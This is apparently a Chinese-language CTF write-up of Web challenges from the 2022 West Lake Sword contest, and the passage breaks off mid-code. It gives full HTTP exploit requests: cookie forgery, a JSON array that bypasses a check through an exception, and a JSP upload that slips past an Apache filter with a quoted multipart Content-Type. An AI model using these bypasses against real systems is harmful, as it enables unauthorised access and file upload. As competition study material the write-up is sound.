## 引言
> **西湖论剑·2022中国杭州网络安全技能大赛**
>
> 全日制高校在校生（含研究生），以所在高校为单位组队参赛，不得跨校组队。 本赛项与IoT攻防赛为同一批参赛选手，建议参赛选手组队时考虑IoT选手的比例。
>
> 线上初赛：2023年2月2日 10:00-18:00
>
> 主流CTF夺旗赛模式
>
> 
又是个因为疫情原因（？）推迟举办的比赛了（
由于只能按照所在高校来组队，不能联合战队，报名结束前两天问了下，校队里一群鸽子还没组队，然后就问了下和学弟们一起组了一队，随便看看题好了。
但是喵喵比较佛系，其实没好好打，当天下午快16.才开始看题，唔（（（
这篇 writeup 里有一些是比赛结束后继续做出来的，也有这过程中卡住然后根据大师傅 wp 复现的，就当学习学习，练练手记录一下好了。
## Web
### Node Magical Login
> 一个简单的用nodejs写的登录站点（貌似暗藏玄机）
`controller.js` 部分源码
    function Flag1Controller(req,res){
        try {
            if(req.cookies.user === SECRET_COOKIE){
                res.setHeader("This_Is_The_Flag1",flag1.toString().trim())
                res.setHeader("This_Is_The_Flag2",flag2.toString().trim())
                res.status(200).type("text/html").send("Login success. Welcome,admin!")
            }
            if(req.cookies.user === "admin") {
                res.setHeader("This_Is_The_Flag1", flag1.toString().trim())
                res.status(200).type("text/html").send("You Got One Part Of Flag! Try To Get Another Part of Flag!")
            }else{
                res.status(401).type("text/html").send("Unauthorized")
            }
        }catch (__) {}
    }
只需要带个 `user=admin` 的 cookie 就行了
    GET /flag1 HTTP/1.1
    Host: 80.endpoint-c1f3c54854b7466b913ba6ed1b2cd64a.m.ins.cloud.dasctf.com:81
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Accept: textml,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: user=admin
    Upgrade-Insecure-Requests: 1
    If-None-Match: W/"3a-RlxhITUNSh+HitDVv+yl4xv4J4I"
第二部分 flag 的话，再看 `controller.js` 源码
    function CheckController(req,res) {
        let checkcode = req.body.checkcode?req.body.checkcode:1234;
        console.log(req.body)
        if(checkcode.length === 16){
            try{
                checkcode = checkcode.toLowerCase()
                if(checkcode !== "aGr5AtSp55dRacer"){
                    res.status(403).json({"msg":"Invalid Checkcode1:" + checkcode})
                }
            }catch (__) {}
            res.status(200).type("text/html").json({"msg":"You Got Another Part Of Flag: " + flag2.toString().trim()})
        }else{
            res.status(403).type("text/html").json({"msg":"Invalid Checkcode2:" + checkcode})
        }
    }
这里如果传个 array 进去的话，调用 `.toLowerCase()` 用法会报错 `Uncaught TypeError:
checkcode.toLowerCase is not a function`，但是捕获异常这里直接就能跳过了，返回第二部分 flag
    POST /getflag2 HTTP/1.1
    Host: 80.endpoint-c1f3c54854b7466b913ba6ed1b2cd64a.m.ins.cloud.dasctf.com:81
    Content-Length: 71
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Content-Type: application/json
    Accept: */*
    Origin: http://80.endpoint-c1f3c54854b7466b913ba6ed1b2cd64a.m.ins.cloud.dasctf.com:81
    Referer: http://80.endpoint-c1f3c54854b7466b913ba6ed1b2cd64a.m.ins.cloud.dasctf.com:81/flag2
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    {"checkcode":["aGr5AtSp55dRacer",2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]}
实际上直接传个长度为16的 array 就行，比如
    {"checkcode":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15]}
### 扭转乾坤
这题附件给的太奇怪了，一个zip里面一个pdf
不过还是看提示
> 在实际产品场景中常见存在多种中间件的情况，这时如果存在某种拦截，可以利用框架或者中间件对于RFC标准中实现差异进行绕过。注意查看80端口服务
直接上传的话，提示
    Sorry,Apache maybe refuse header equals Content-Type: multipart/form-data;.
于是要在 `Content-Type: multipart/form-data` 上做文章
参考 
利用 RFC 差异来绕过，加个引号就过了
    POST /ctf/hello-servlet HTTP/1.1
    Host: 1.14.65.100
    Content-Length: 3246
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://1.14.65.100
    Content-Type: multipart/"form-data"; boundary=----WebKitFormBoundary3oAve6BcRBg213uo
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://1.14.65.100/ctf
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    ------WebKitFormBoundary3oAve6BcRBg213uo
    Content-Disposition: form-data; name="uploadfile"; filename="bypass.jsp"
    Content-Type: application/octet-stream
    miaotony
    ------WebKitFormBoundary3oAve6BcRBg213uo--    
DASCTF{407a13a21a6b85b1236b003479468c82}
赛后又试了试，貌似只需要不出现完整的 `multipart/form-data` 就能过，但是必须有 `multipart/`
（感觉这样出题也太迷了
### real_ez_node
`app.js`
    var createError = require('http-errors');
    var express = require('express');
    var path = require('path');
    var fs = require('fs');
    const lodash = require('lodash')
    var cookieParser = require('cookie-parser');
    var logger = require('morgan');
    var session = require('express-session');
    var index = require('./routes/index');
    var bodyParser = require('body-parser');//解析,用req.body获取post参数
    var app = express();
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({extended: false}));
    app.use(cookieParser());
    app.use(session({
      secret : 'secret', // 对session id 相关的cookie 进行签名
      resave : true,
      saveUninitialized: false, // 是否保存未初始化的会话
      cookie : {
        maxAge : 1000 * 60 * 3, // 设置 session 的有效时间，单位毫秒
      },
    }));
    // view engine setup
    app.set('views', path.join(__dirname, 'views'));
    app.set('view engine', 'ejs');
    // app.engine('ejs', function (filePath, options, callback) {    // 设置使用 ejs 模板引擎 
    //   fs.readFile(filePath, (err, content) => {
    //       if (err) return callback(new Error(err))
    //       let compiled = lodash.template(content)    // 使用 lodash.template 创建一个预编译模板方法供后面使用
    //       let rendered = compiled()
    //       return callback(null, rendered)
    //   })
    // });
    app.use(logger('dev'));
    app.use(express.static(path.join(__dirname, 'public')));
    app.use('/', index);
    // app.use('/challenge7', challenge7);
    // catch 404 and forward to error handler
    app.use(function(req, res, next) {
      next(createError(404));
    });
    // error handler
    app.use(function(err, req, res, next) {
      // set locals, only providing error in development
      res.locals.message = err.message;
      res.locals.error = req.app.get('env') === 'development' ? err : {};
      // render the error page
      res.status(err.status || 500);
      res.render('error');
    });
    module.exports = app;
`routes/index.js`
    var express = require('express');
    var http = require('http');
    var router = express.Router();
    const safeobj = require('safe-obj');
    router.get('/',(req,res)=>{
      if (req.query.q) {
        console.log('get q');
      }
      res.render('index');
    })
    router.post('/copy',(req,res)=>{
      res.setHeader('Content-type','text/html;charset=utf-8')
      var ip = req.connection.remoteAddress;
      console.log(ip);
      var obj = {
          msg: '',
      }
      if (!ip.includes('127.0.0.1')) {
          obj.msg="only for admin"
          res.send(JSON.stringify(obj));
          return 
      }
      let user = {};
      for (let index in req.body) {
          if(!index.includes("__proto__")){
              safeobj.expand(user, index, req.body[index])
          }
        }
      res.render('index');
    })
    router.get('/curl', function(req, res) {